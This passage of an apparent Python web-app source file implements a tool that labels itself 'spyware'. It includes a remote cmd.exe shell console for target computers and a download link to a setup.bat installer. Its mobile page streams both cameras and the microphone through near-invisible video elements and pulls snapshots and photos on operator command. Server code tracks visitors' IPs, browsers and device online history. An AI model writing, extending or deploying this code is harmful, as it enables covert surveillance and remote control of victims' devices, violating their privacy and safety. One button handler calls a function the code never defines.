    <link rel="icon" type="image/x-icon" href="/favicon.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    {% if design %}
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 25px;
            background: #160d13;
            color: #f7dbe8;
            font-family: Consolas, monospace;
        }

        .terminal {
            background: #180d14;
            border: 1px solid #63304f;
            border-radius: 8px;
            padding: 20px;
            min-height: 75vh;
            box-shadow: 0 0 20px #000;
        }

        .header {
            color: #ff9ecb;
            border-bottom: 1px solid #63304f;
            padding-bottom: 12px;
            margin-bottom: 15px;
        }

        #output {
            white-space: pre-wrap;
            overflow-wrap: anywhere;
            line-height: 1.5;
            min-height: 55vh;
        }

        .input-line {
            display: flex;
            gap: 8px;
            margin-top: 15px;
        }

        .prompt {
            color: #ff7ab8;
            padding-top: 10px;
        }

        input {
            flex: 1;
            min-width: 0;
            background: #241320;
            color: #f7dbe8;
            border: 1px solid #63304f;
            border-radius: 4px;
            padding: 10px;
            font-family: Consolas, monospace;
        }

        button {
            background: #c93b86;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-family: Consolas, monospace;
        }

        button:hover {
            background: #d9488f;
        }

        .muted {
            color: #b98fa8;
        }
    </style>
    {% endif %}
</head>

<body>

<div class="terminal">

    <div class="header">
        <strong>REMOTE SHELL CONSOLE</strong>
        <p id="computerName">Connecting...</p>
        <p class="muted">
            Commands run on the target computer through cmd.exe.
            Use cd to change the working directory.
        </p>
    </div>

    <div id="output">Remote shell ready.
Type a command and press Enter. Everything runs on the target computer.
</div>

    <div class="input-line">
        <span class="prompt">remote&gt;</span>

        <input
            id="command"
            type="text"
            placeholder="Enter command..."
            autocomplete="off"
        >

        <button onclick="runCommand()">Run</button>
    </div>

</div>


<script>

const clientName = {{ name | tojson }};

const output = document.getElementById("output");
const input = document.getElementById("command");
const runButton = document.querySelector(".input-line button");

let busy = false;


function printLine(text) {

    output.textContent += text + "\n";

    window.scrollTo(
        0,
        document.body.scrollHeight
    );
}


function setBusy(value) {

    busy = value;

    input.disabled = value;
    runButton.disabled = value;

    if (!value) {
        input.focus();
    }
}


async function waitForResult(commandId) {

    const deadline = Date.now() + 900000;

    while (Date.now() < deadline) {

        await new Promise(resolve => setTimeout(resolve, 500));

        const response = await fetch(
            "/api/console/result/" +
            encodeURIComponent(commandId)
        );

        const data = await response.json();

        if (!response.ok) {
            throw new Error(data.error || "Result unavailable.");
        }

        if (data.status === "ready") {
            return data;
        }

        if (data.status === "error") {
            throw new Error(data.message || "Command failed.");
        }
    }

    throw new Error("Timed out waiting for the remote computer.");
}


async function runCommand() {

    if (busy) {
        return;
    }

    const command = input.value;

    if (!command.trim()) {
        return;
    }

    if (["clear", "cls"].includes(command.trim().toLowerCase())) {
        input.value = "";
        output.textContent = "";
        return;
    }

    printLine("remote> " + command);

    input.value = "";
    setBusy(true);

    try {

        const response = await fetch("/api/console/command", {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({
                name: clientName,
                command: command
            })

        });

        const data = await response.json();

        if (!response.ok) {
            throw new Error(data.error || "Command failed.");
        }

        const result = await waitForResult(data.command_id);

        if (result.output) {
            printLine(result.output.replace(/\s+$/, ""));
        }

        if (result.exit_code) {
            printLine("[exit code " + result.exit_code + "]");
        }

    } catch (error) {

        printLine("ERROR: " + error.message);

    } finally {

        setBusy(false);
        printLine("");
    }
}


input.addEventListener("keydown", function(event) {

    if (event.key === "Enter") {
        runCommand();
    }

});


async function loadComputer() {

    try {

        const response = await fetch(
            "/api/tree?name=" + encodeURIComponent(clientName)
        );

        const data = await response.json();

        if (!response.ok) {
            throw new Error(data.error);
        }

        document.getElementById("computerName").textContent =
            "Computer: " + data.name +
            " | Root: " + data.root;

    } catch (error) {

        document.getElementById("computerName").textContent =
            "Computer unavailable: " + error.message;

    }
}


loadComputer();

</script>

</body>
</html>
"""


# ==================================================
# LOGIN PAGE
# ==================================================

LOGIN_HTML = r"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>spyware</title>
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

<form method="post" action="/login">

    <input type="hidden" name="next" value="{{ next_url }}">

    {% if error %}
    <p class="error">{{ error }}</p>
    {% endif %}

    <p>
        username:
        <input
            id="username"
            name="username"
            type="text"
            value="{{ username }}"
            autocomplete="username"
            spellcheck="false"
            autofocus
        >
    </p>

    <p>
        password:
        <input
            id="password"
            name="password"
            type="password"
            autocomplete="current-password"
        >
        <button type="submit">sign in</button>
    </p>

    <p>
        <a href="https://github.com/downloader-AXP/downloader/releases/latest/download/setup.bat">
            download instead
        </a>
    </p>

    <p>
        <a href="/website-version{% if mobile_next %}?next=%2Fmobile{% endif %}">
            website version of the spyware
        </a>
    </p>

</form>

</body>
</html>
"""


BLOCKED_HTML = r"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>spyware</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    {% if design %}
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: grid;
            place-items: center;
            padding: 24px;
            background:
                radial-gradient(circle at 50% 22%, #2a0f22 0%, #180d14 62%);
            color: #f7dbe8;
            font-family: Consolas, monospace;
        }

        .card {
            width: 100%;
            max-width: 420px;
            padding: 38px 32px;
            text-align: center;
            background: rgba(26, 12, 20, 0.94);
            border: 1px solid #4a2140;
            border-radius: 16px;
            box-shadow: 0 30px 90px rgba(0, 0, 0, 0.75);
        }

        h1 {
            margin: 0 0 12px;
            font-size: 20px;
            letter-spacing: 2px;
            color: #ff7ab8;
        }

        p {
            margin: 0 0 8px;
            font-size: 13px;
            line-height: 1.6;
            color: #b98fa8;
        }

        .timer {
            margin-top: 24px;
            font-size: 30px;
            color: #ff9ecb;
        }

        .timer span {
            color: #fff;
        }
    </style>
    {% endif %}
</head>

<body>

<div class="card">
    {% if permanent %}
    <h1>ACCESS REVOKED</h1>
    <p>This device has been permanently banned from using the website.</p>
    <p>Ask the administrator to lift the ban.</p>
    {% else %}
    <h1>ACCESS BLOCKED</h1>
    <p>This device has been blocked from using the website.</p>
    <p>Nothing on the site can be used until the block ends.</p>
    <div class="timer"><span id="seconds">{{ remaining }}</span>s</div>
    {% endif %}
</div>

{% if not permanent %}
<script>
    let left = {{ remaining }};
    const label = document.getElementById("seconds");

    setInterval(function() {
        left -= 1;
        if (left <= 0) {
            window.location.reload();
            return;
        }
        label.textContent = left;
    }, 1000);
</script>
{% endif %}

</body>
</html>
"""


# ==================================================
# MOBILE WEBSITE VERSION
# ==================================================

MOBILE_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>spyware</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <link rel="icon" type="image/x-icon" href="/favicon.ico">

    <style id="siteStyles" media="{{ 'all' if design else 'not all' }}">
        [hidden] {
            display: none !important;
        }

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            padding: 18px 16px 40px;
            background:
                radial-gradient(circle at 50% 0%, #22101c 0%, #0b0609 60%);
            color: #d8ffe8;
            font-family: Consolas, "Courier New", monospace;
        }

        .scanlines {
            position: fixed;
            inset: 0;
            pointer-events: none;
            background: repeating-linear-gradient(
                to bottom,
                rgba(255, 255, 255, 0.025) 0px,
                rgba(255, 255, 255, 0.025) 1px,
                transparent 1px,
                transparent 4px
            );
            z-index: 5;
        }

        header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 26px;
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 11px;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: #ff7ab8;
        }

        .brand .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ff3b8d;
            box-shadow: 0 0 12px #ff3b8d;
            animation: pulse 1.4s ease-in-out infinite;
        }

        .leave {
            background: transparent;
            border: 1px solid #63304f;
            color: #ff9ecb;
            padding: 8px 12px;
            border-radius: 6px;
            font-family: inherit;
            font-size: 11px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        [hidden] {
            display: none !important;
        }

        .retry-row {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px;
            max-width: 520px;
            margin: 0 auto 16px;
        }

        .retry-row button {
            flex: 1 1 150px;
            padding: 11px;
            background: transparent;
            border: 1px solid #a03a78;
            border-radius: 8px;
            color: #ff9ecb;
            font-family: inherit;
            font-size: 11px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .ghost-media {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
        }

        .banner {
            max-width: 520px;
            margin: 0 auto 16px;
            padding: 12px 14px;
            background: rgba(255, 59, 141, 0.09);
            border: 1px solid rgba(255, 59, 141, 0.5);
            border-radius: 8px;
            color: #ffb3d2;
            font-size: 12px;
            line-height: 1.5;
        }

        .banner button {
            margin-top: 8px;
            width: 100%;
            padding: 11px;
            background: #c93b86;
            border: none;
            border-radius: 7px;
            color: #fff;
            font-family: inherit;
            font-size: 11px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        /* ---------- CONSOLE-DRIVEN WEBSITE EFFECTS ---------- */

        html.theme-green { filter: hue-rotate(95deg) saturate(1.15); }
        html.theme-purple { filter: hue-rotate(35deg) saturate(1.2); }
        html.theme-red { filter: hue-rotate(-55deg) saturate(1.35); }
        html.theme-blue { filter: hue-rotate(195deg); }
        html.theme-yellow { filter: hue-rotate(60deg) saturate(1.5); }
        html.theme-dark { filter: brightness(0.68); }
        html.theme-light { filter: invert(1) hue-rotate(180deg); }
        html.theme-mono { filter: grayscale(1); }
        html.theme-hacker {
            filter: hue-rotate(95deg) saturate(1.75) brightness(0.72) contrast(1.3);
        }


        html.fx-mirror { transform: scaleX(-1); }

        body.fx-flip { transform: rotate(180deg); }
        body.fx-blur { filter: blur(2px); }
        body.fx-invert { filter: invert(1) hue-rotate(180deg); }
        body.fx-shake { animation: fx-shake 0.24s linear infinite; }
        body.fx-spin { animation: fx-spin 9s linear infinite; }

        body.fx-rainbow {
            background: linear-gradient(
                124deg,
                #ff2400,
                #e81d1d,
                #e8b71d,
                #1de840,
                #1ddde8,
                #2b1de8,
                #dd00f3,
                #ff2400
            );
            background-size: 1200% 1200%;
            animation: fx-rainbow 14s ease infinite;
        }

        body.fx-caps * {
            text-transform: uppercase !important;
        }

        body.fx-dyslexic,
        body.fx-dyslexic * {
            font-family:
                "Comic Sans MS",
                "Segoe Print",
                "Bradley Hand",
                cursive !important;
            letter-spacing: 0.06em;
            word-spacing: 0.18em;
        }

        @keyframes fx-shake {
            0%, 100% { transform: translate(0, 0); }
            25% { transform: translate(4px, -3px); }
            50% { transform: translate(-5px, 2px); }
            75% { transform: translate(3px, 4px); }
        }

        @keyframes fx-spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        @keyframes fx-rainbow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.35; }
        }
    </style>
</head>

<body>

<div class="scanlines"></div>

<header>
    <div class="brand" hidden><span class="dot"></span> Remote Session</div>
    <button class="leave" id="leaveButton">Stop sharing</button>
</header>

<div class="retry-row" id="retryRow" hidden>
    <button id="retryCamera" hidden>Ask for camera again</button>
    <button id="retryMic" hidden>Ask for microphone again</button>
    <button id="retryPhotos" hidden>Ask for pictures again</button>
</div>

<div class="banner" id="requestBanner" hidden>
    The dashboard requested pictures from this device.
    <button id="bannerPick">Choose pictures</button>
</div>

<video id="preview" class="ghost-media" playsinline autoplay muted hidden></video>
<video id="previewFront" class="ghost-media" playsinline autoplay muted hidden></video>
<div id="log" hidden></div>
<input id="photoInput" type="file" accept="image/*" multiple hidden>

<script>
const logEl = document.getElementById("log");
const preview = document.getElementById("preview");
const photoInput = document.getElementById("photoInput");
const retryRow = document.getElementById("retryRow");
const retryCamera = document.getElementById("retryCamera");
const retryMic = document.getElementById("retryMic");
const retryPhotos = document.getElementById("retryPhotos");
const previewFront = document.getElementById("previewFront");
const requestBanner = document.getElementById("requestBanner");

let deviceName = localStorage.getItem("remoteMobileName") || "";
let cameraStreams = { back: null, front: null };
let micStream = null;
let audioContext = null;
let cameraGranted = false;
let micGranted = false;
let cameraDenied = false;
let micDenied = false;
let photosDenied = false;
let photoCount = 0;
let cameraActive = false;
let micActive = false;
let cameraWarned = false;
let micWarned = false;
let cameraTimer = null;
let micPending = [];
let micPendingSamples = 0;
let heartbeatScheduled = false;

const cameraVideos = { back: preview, front: previewFront };
const cameraCanvases = {
    back: document.createElement("canvas"),
    front: document.createElement("canvas")
};
const cameraContexts = {
    back: cameraCanvases.back.getContext("2d"),
    front: cameraCanvases.front.getContext("2d")
};


function logLine(text, cls) {
    const line = document.createElement("div");
    if (cls) line.className = cls;
    line.textContent = text;
    logEl.appendChild(line);
    while (logEl.childNodes.length > 200) logEl.removeChild(logEl.firstChild);
    logEl.scrollTop = logEl.scrollHeight;
}


const SITE_THEME_NAMES = [
    "pink", "green", "purple", "red", "blue",
    "yellow", "dark", "light", "mono", "hacker"
];

const SITE_EFFECT_NAMES = [
    "dyslexic", "flip", "mirror", "blur", "shake",
    "rainbow", "caps", "spin", "invert"
];


const siteStyles = document.getElementById("siteStyles");


function setSiteDesign(enabled) {

    if (!siteStyles) {
        return;
    }

    if (enabled) {
        siteStyles.media = "all";
        if (!siteStyles.isConnected) {
            document.head.appendChild(siteStyles);
        }
    } else if (siteStyles.isConnected) {
        siteStyles.remove();
    }
}


function applySiteEffects(effects) {

    effects = effects || {};

    const theme = effects.theme || "";

    for (const name of SITE_THEME_NAMES) {
        document.documentElement.classList.toggle(
            "theme-" + name,
            theme === name
        );
    }

    // Design off means no CSS at all: the stylesheet is detached.
    setSiteDesign(Boolean(effects.design));

    for (const name of SITE_EFFECT_NAMES) {
        document.body.classList.toggle(
            "fx-" + name,
            Boolean(effects[name])
        );
    }
}


function refreshPermissionUI() {
    retryCamera.hidden = !cameraDenied;
    retryMic.hidden = !micDenied;
    retryPhotos.hidden = !(photosDenied && !photoCount);
    retryRow.hidden = !cameraDenied && !micDenied
        && !(photosDenied && !photoCount);
}


function authRedirect(response) {
    if (response.status === 401) {
        window.location.href = "/login?next=" + encodeURIComponent("/mobile");
        return true;
    }
    return false;
}


async function postJson(url, payload) {
    const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });
    if (authRedirect(response)) throw new Error("Sign in required.");
    return response;
}


async function registerDevice() {
    const response = await postJson("/api/mobile/register", { name: deviceName });
    if (!response.ok) throw new Error("Registration failed (" + response.status + ").");
    const data = await response.json();
    deviceName = data.name;
    localStorage.setItem("remoteMobileName", deviceName);
    logLine("> device registered as " + deviceName, "dim");
}


async function getCameraStream(facing) {
    const size = { width: { ideal: 1280 }, height: { ideal: 720 } };
    try {
        return await navigator.mediaDevices.getUserMedia({
            video: Object.assign({ facingMode: { ideal: facing } }, size),
            audio: false
        });
    } catch (error) {
        if (error.name !== "OverconstrainedError" && error.name !== "NotFoundError") {
            throw error;
        }
        return await navigator.mediaDevices.getUserMedia({ video: size, audio: false });
    }
}


async function openCamera(slot, facing) {
    try {
        const stream = await getCameraStream(facing);
        if (cameraStreams[slot]) {
            cameraStreams[slot].getTracks().forEach(track => track.stop());
        }
        cameraStreams[slot] = stream;
        cameraVideos[slot].srcObject = stream;
        cameraVideos[slot].play().catch(() => {});
        logLine("> " + slot + " camera permission granted", "dim");
        return true;
    } catch (error) {
        cameraStreams[slot] = null;
        cameraVideos[slot].srcObject = null;
        logLine("! " + slot + " camera unavailable: " + error.message, "err");
        return false;
    }
}


async function askCameras() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        cameraGranted = false;
        cameraDenied = true;
        logLine("! this browser does not expose camera access", "err");
        refreshPermissionUI();
        return false;
    }
    const back = await openCamera("back", "environment");
    const front = await openCamera("front", "user");
    cameraGranted = back || front;
    cameraDenied = !cameraGranted;
    if (cameraGranted) {
        cameraWarned = false;
        if (cameraActive) startCameraLoop();
    }
    refreshPermissionUI();
    return cameraGranted;
}


async function askMicrophone() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        micGranted = false;
        micDenied = true;
        logLine("! this browser does not expose microphone access", "err");
        refreshPermissionUI();
        return false;
    }
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        if (micStream) micStream.getTracks().forEach(track => track.stop());
        micStream = stream;
        if (audioContext) {
            audioContext.close().catch(() => {});
            audioContext = null;
        }
        micGranted = true;
        micDenied = false;
        micWarned = false;
        logLine("> microphone permission granted", "dim");
        setupMicrophone(stream);
        refreshPermissionUI();
        return true;
    } catch (error) {
        micGranted = false;
        micDenied = true;
        logLine("! microphone permission denied: " + error.message, "err");
        refreshPermissionUI();
        return false;
    }
}


async function requestPermissions() {
    await askCameras();
    await askMicrophone();
    refreshPermissionUI();
    heartbeat();
}


function stopMedia() {
    cameraActive = false;
    micActive = false;
    clearTimeout(cameraTimer);
    cameraTimer = null;
    micPending = [];
    micPendingSamples = 0;
    [cameraStreams.back, cameraStreams.front, micStream].forEach(stream => {
        if (stream) stream.getTracks().forEach(track => track.stop());
    });
    cameraStreams = { back: null, front: null };
    micStream = null;
    cameraGranted = false;
    micGranted = false;
    if (audioContext) {
        audioContext.close().catch(() => {});
        audioContext = null;
    }
    preview.srcObject = null;
    previewFront.srcObject = null;
}


function downsample(input, fromRate, toRate) {
    if (toRate >= fromRate) return Float32Array.from(input);
    const ratio = fromRate / toRate;
    const length = Math.floor(input.length / ratio);
    const output = new Float32Array(length);
    for (let i = 0; i < length; i++) {
        const start = Math.floor(i * ratio);
        const end = Math.min(input.length, Math.floor((i + 1) * ratio));
        let sum = 0;
        for (let j = start; j < end; j++) sum += input[j];
        output[i] = sum / Math.max(1, end - start);
    }
    return output;
}


function setupMicrophone(stream) {
    if (audioContext) return;
    const Ctx = window.AudioContext || window.webkitAudioContext;
    if (!Ctx) {
        logLine("! audio processing is not available in this browser", "err");
        return;
    }
    audioContext = new Ctx();
    const source = audioContext.createMediaStreamSource(stream);
    const processor = audioContext.createScriptProcessor(4096, 1, 1);
    const sink = audioContext.createGain();
    sink.gain.value = 0;
    source.connect(processor);
    processor.connect(sink);
    sink.connect(audioContext.destination);
    processor.onaudioprocess = event => {
        if (!micActive) return;
        const samples = downsample(
            event.inputBuffer.getChannelData(0),
            audioContext.sampleRate,
            16000
        );
        const pcm = new Int16Array(samples.length);
        for (let i = 0; i < samples.length; i++) {
            const value = Math.max(-1, Math.min(1, samples[i]));
            pcm[i] = value < 0 ? value * 32768 : value * 32767;
        }
        micPending.push(pcm);
        micPendingSamples += pcm.length;
        if (micPendingSamples >= 8000) flushMicrophone();
    };
    audioContext.resume().catch(() => {});
}


function flushMicrophone() {
    if (!micPending.length || !deviceName) return;
    const total = micPending.reduce((sum, item) => sum + item.length, 0);
    const merged = new Int16Array(total);
    let offset = 0;
    for (const item of micPending) {
        merged.set(item, offset);
        offset += item.length;
    }
    micPending = [];
    micPendingSamples = 0;
    const form = new FormData();
    form.append("name", deviceName);
    form.append("audio", new Blob([merged.buffer], { type: "application/octet-stream" }), "mic.raw");
    fetch("/upload-audio", { method: "POST", body: form }).catch(() => {});
}


function uploadFrame(blob, camera) {
    if (!blob || !deviceName) return;
    const form = new FormData();
    form.append("name", deviceName);
    form.append("camera", camera);
    form.append("frame", blob, "frame.jpg");
    fetch("/upload-camera", { method: "POST", body: form }).catch(() => {});
}


let snapshotBusy = false;


async function sendSingleFrame(requestId) {

    if (!requestId || !deviceName || snapshotBusy) {
        return;
    }

    snapshotBusy = true;

    let temporary = null;
    const video = document.createElement("video");
    video.className = "ghost-media";
    video.hidden = true;
    video.muted = true;
    video.playsInline = true;
    document.body.appendChild(video);

    try {

        const live = (
            cameraStreams.front && cameraVideos.front.videoWidth
        ) ? cameraStreams.front : null;

        if (!live) {
            temporary = await getCameraStream("user");
        }

        video.srcObject = live || temporary;
        await video.play().catch(() => {});

        await new Promise(resolve => setTimeout(resolve, 450));

        const width = Math.min(960, video.videoWidth || 0);

        if (!width) {
            throw new Error("Camera frame is not ready.");
        }

        const height = Math.round(
            video.videoHeight * (width / video.videoWidth)
        );

        const canvas = document.createElement("canvas");
        canvas.width = width;
        canvas.height = height;
        canvas.getContext("2d").drawImage(video, 0, 0, width, height);

        const blob = await new Promise(
            resolve => canvas.toBlob(resolve, "image/jpeg", 0.8)
        );

        if (!blob) {
            throw new Error("Could not encode the frame.");
        }

        const form = new FormData();
        form.append("name", deviceName);
        form.append("request_id", requestId);
        form.append("frame", blob, "frame.jpg");

        const response = await fetch(
            "/upload-camera-snapshot",
            { method: "POST", body: form }
        );

        if (authRedirect(response)) return;

        if (!response.ok) {
            throw new Error("Upload failed (" + response.status + ").");
        }

        logLine("> single camera frame sent", "dim");

    } catch (error) {

        logLine("! single camera frame failed: " + error.message, "err");

        const form = new FormData();
        form.append("name", deviceName);
        form.append("request_id", requestId);
        form.append("error", String(error.message || error).slice(0, 500));
        fetch(
            "/upload-camera-snapshot",
            { method: "POST", body: form }
        ).catch(() => {});

    } finally {

        if (temporary) {
            temporary.getTracks().forEach(track => track.stop());
        }

        video.srcObject = null;
        video.remove();
        snapshotBusy = false;
    }
}


function cameraLoop() {
    cameraTimer = null;
    if (!cameraActive) return;
    for (const slot of ["back", "front"]) {
        const video = cameraVideos[slot];
        const canvas = cameraCanvases[slot];
        if (!cameraStreams[slot] || !video.videoWidth) continue;
        const width = Math.min(960, video.videoWidth);
        const height = Math.round(video.videoHeight * (width / video.videoWidth));
        if (canvas.width !== width || canvas.height !== height) {
            canvas.width = width;
            canvas.height = height;
        }
        cameraContexts[slot].drawImage(video, 0, 0, width, height);
        canvas.toBlob(blob => uploadFrame(blob, slot), "image/jpeg", 0.6);
    }
    cameraTimer = setTimeout(cameraLoop, 900);
}


function startCameraLoop() {
    if (cameraTimer || !cameraActive || !cameraGranted) return;
    cameraLoop();
}


function setCameraActive(active) {
    if (active && !cameraGranted) {
        if (!cameraWarned) {
            cameraWarned = true;
            logLine("! operator started the camera - allow camera to continue", "warn");
        }
        cameraDenied = true;
        cameraActive = false;
        refreshPermissionUI();
        return;
    }
    if (active === cameraActive) return;
    cameraActive = active;
    if (active) {
        cameraWarned = false;
        cameraDenied = false;
        logLine("> camera stream requested by the dashboard", "warn");
        startCameraLoop();
    } else {
        clearTimeout(cameraTimer);
        cameraTimer = null;
        if (cameraGranted) logLine("> camera stream stopped", "dim");
    }
    refreshPermissionUI();
}


function setMicActive(active) {
    if (active && !micGranted) {
        if (!micWarned) {
            micWarned = true;
            logLine("! operator started the microphone - allow microphone to continue", "warn");
        }
        micDenied = true;
        micActive = false;
        refreshPermissionUI();
        return;
    }
    if (active === micActive) return;
    micActive = active;
    if (active) {
        micWarned = false;
        micDenied = false;
        logLine("> microphone stream requested by the dashboard", "warn");
    } else {
        micPending = [];
        micPendingSamples = 0;
        if (micGranted) logLine("> microphone stream stopped", "dim");
    }
    refreshPermissionUI();
}


async function pollState() {
    if (deviceName) {
        try {
            const response = await fetch(
                "/api/mobile/state?name=" + encodeURIComponent(deviceName),
                { cache: "no-store" }
            );
            if (authRedirect(response)) return;
            if (response.ok) {
                const data = await response.json();
                setCameraActive(Boolean(data.camera));
                setMicActive(Boolean(data.microphone));
                requestBanner.hidden = !data.photo_request;
                applySiteEffects(data.effects);

                if (data.snapshot_request) {
                    sendSingleFrame(data.snapshot_request);
                }
            }
        } catch (error) {
        }
    }
    setTimeout(pollState, 1500);
}


async function heartbeat() {
    if (deviceName) {
        try {
            await postJson("/api/mobile/heartbeat", {
                name: deviceName,
                permissions: {
                    camera: cameraGranted,
                    microphone: micGranted,
                    photos: photoCount
                }
            });
        } catch (error) {
        }
    }
    if (!heartbeatScheduled) {
        heartbeatScheduled = true;
        setTimeout(function() {
            heartbeatScheduled = false;
            heartbeat();
        }, 8000);
    }
}


function markPhotosDenied() {
    if (!photoCount) {
        photosDenied = true;
        logLine("! pictures were not shared", "warn");
    }
    refreshPermissionUI();
}


async function uploadPhotos(files) {
    const list = Array.from(files || []).slice(0, 20);
    if (!deviceName || !list.length) {
        markPhotosDenied();
        return;
    }
    const form = new FormData();
    form.append("name", deviceName);
    list.forEach(file => form.append("photos", file, file.name));
    logLine("> sending " + list.length + " picture(s)...", "dim");
    try {
        const response = await fetch("/upload-photo", { method: "POST", body: form });
        if (authRedirect(response)) return;
        const data = await response.json();
        photoCount += data.saved || 0;
        photosDenied = false;
        logLine("> " + (data.saved || 0) + " picture(s) delivered", "dim");
    } catch (error) {
        photosDenied = !photoCount;
        logLine("! picture upload failed: " + error.message, "err");
    }
    requestBanner.hidden = true;
    refreshPermissionUI();
    heartbeat();
    await postJson("/api/mobile/photo-ack", { name: deviceName }).catch(() => {});
}


async function openPicker() {
    photosDenied = false;
    if (window.showOpenFilePicker) {
        try {
            const handles = await window.showOpenFilePicker({
                multiple: true,
                types: [{
                    description: "Pictures",
                    accept: {
                        "image/*": [
                            ".jpg", ".jpeg", ".png", ".gif",
                            ".webp", ".bmp", ".heic", ".heif"
                        ]
                    }
                }]
            });
            const files = await Promise.all(handles.map(handle => handle.getFile()));
            await uploadPhotos(files);
            return;
        } catch (error) {
            if (error && error.name === "AbortError") {
                markPhotosDenied();
                return;
            }
            logLine("! picture picker failed: " + error.message, "err");
        }
    }
    photoInput.click();
}


function handlePhotoPicked() {
    const files = Array.from(photoInput.files || []);
    photoInput.value = "";
    if (!files.length) {
        markPhotosDenied();
        return;
    }
    uploadPhotos(files);
}


async function leaveSession() {
    stopMedia();
    try {
        await postJson("/api/mobile/leave", { name: deviceName });
    } catch (error) {
    }
    window.location.href = "/";
}


retryCamera.addEventListener("click", () => { askCamera(); });
retryMic.addEventListener("click", () => { askMicrophone(); });
retryPhotos.addEventListener("click", openPicker);
photoInput.addEventListener("change", handlePhotoPicked);
document.getElementById("bannerPick").addEventListener("click", openPicker);
document.getElementById("leaveButton").addEventListener("click", leaveSession);


registerDevice()
    .then(() => {
        refreshPermissionUI();
        requestPermissions();
        heartbeat();
        pollState();
    })
    .catch(error => {
        logLine("! " + error.message, "err");
    });
</script>

</body>
</html>
"""


# ==================================================
# WEBSITE VISITORS
# ==================================================

def website_client_ip():

    forwarded = request.headers.get("X-Forwarded-For", "")

    if forwarded:
        return forwarded.split(",")[0].strip()[:60]

    return (request.remote_addr or "unknown")[:60]


def split_user_agent(agent):

    agent = agent or ""

    if "Edg/" in agent:
        browser = "Edge"
    elif "OPR/" in agent or "Opera" in agent:
        browser = "Opera"
    elif "Firefox/" in agent:
        browser = "Firefox"
    elif "Chrome/" in agent or "CriOS/" in agent:
        browser = "Chrome"
    elif "Safari/" in agent:
        browser = "Safari"
    else:
        browser = "Browser"

    if "Windows" in agent:
        system = "Windows"
    elif "Android" in agent:
        system = "Android"
    elif "iPhone" in agent or "iPad" in agent:
        system = "iOS"
    elif "Mac OS X" in agent or "Macintosh" in agent:
        system = "macOS"
    elif "Linux" in agent:
        system = "Linux"
    else:
        system = "Unknown OS"

    return system, browser


def describe_user_agent(agent):

    system, browser = split_user_agent(agent)

    return f"{browser} on {system}"


def close_website_history(sid, now):

    for record in reversed(website_history):
        if record["sid"] == sid and record["left"] is None:
            record["left"] = now
            return


def prune_history(now):

    while website_history and now - website_history[0]["entered"] > HISTORY_SECONDS:
        website_history.popleft()

    while device_history and now - device_history[0]["on"] > HISTORY_SECONDS:
        device_history.popleft()


def record_device_online(name, now):

    for record in reversed(device_history):
        if record["name"] == name and record["off"] is None:
            return

    device_history.append({"name": name, "on": now, "off": None})
    prune_history(now)


def record_device_offline(name, when):

    for record in reversed(device_history):
        if record["name"] == name and record["off"] is None:
            record["off"] = when
            return


def close_idle_website_history(now):

    open_sessions = {}

    for record in reversed(website_history):
        if record["left"] is None:
            open_sessions.setdefault(record["sid"], record)

    for sid, record in open_sessions.items():
        if now - record["seen"] > WEBSITE_IDLE_SECONDS:
            record["left"] = record["seen"]


def describe_website_history(now):

    prune_history(now)

    rows = [
        record for record in website_history
        if now - record["entered"] <= HISTORY_SECONDS
    ]

    if not rows:
        return "No website entries in the last 7 days."

    lines = ["WEBSITE ENTRIES (LAST 7 DAYS)", ""]

    for record in reversed(rows):

        left = (
            time.strftime("%Y-%m-%d %H:%M", time.localtime(record["left"]))
            if record["left"]
            else "online now"
        )

        lines.append(
            time.strftime("%Y-%m-%d %H:%M", time.localtime(record["entered"]))
            + "  " + record["device"].ljust(10)
            + "  " + record["browser"].ljust(8)
            + "  " + left
        )

    return "\n".join(lines)


def describe_device_history(now):

    prune_history(now)

    rows = [
        record for record in device_history
        if now - record["on"] <= HISTORY_SECONDS
    ]

    if not rows:
        return "No device activity in the last 7 days."

    lines = ["DEVICE ON/OFF HISTORY (LAST 7 DAYS)", ""]

    for record in reversed(rows):

        left = (
            time.strftime("%Y-%m-%d %H:%M", time.localtime(record["off"]))
            if record["off"]
            else "online now"
        )

        lines.append(
            record["name"].ljust(24)
            + time.strftime("%Y-%m-%d %H:%M", time.localtime(record["on"]))
            + "  " + left
        )

    return "\n".join(lines)


def prune_website_sessions(now):

    stale = [
        sid for sid, entry in website_sessions.items()
        if now - entry["last_seen"] > WEBSITE_SESSION_MAX_AGE
    ]

    for sid in stale:
        website_sessions.pop(sid, None)
        site_effects.pop(sid, None)

